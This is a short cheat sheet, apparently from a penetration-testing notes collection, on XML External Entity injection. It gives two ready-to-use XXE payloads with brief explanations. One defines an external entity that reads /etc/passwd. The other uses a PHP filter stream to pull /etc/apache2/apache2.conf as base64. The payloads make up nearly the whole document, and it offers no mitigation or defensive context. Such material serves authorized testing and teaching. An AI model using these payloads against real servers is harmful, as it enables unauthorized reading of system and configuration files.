# XML External Entity

## Requesting /etc/passwd from Filesystem
Providing the XML below would return the contents from /etc/passwd between the data XML tags.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

## Requesting Apache2 Configuration Using PHP I/O Filter Stream
Providing the XML below would return the contents of /etc/apache2/apache2.conf encoded as base64 between the data XML tags.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf">
]>
<data>&xxe;</data>
```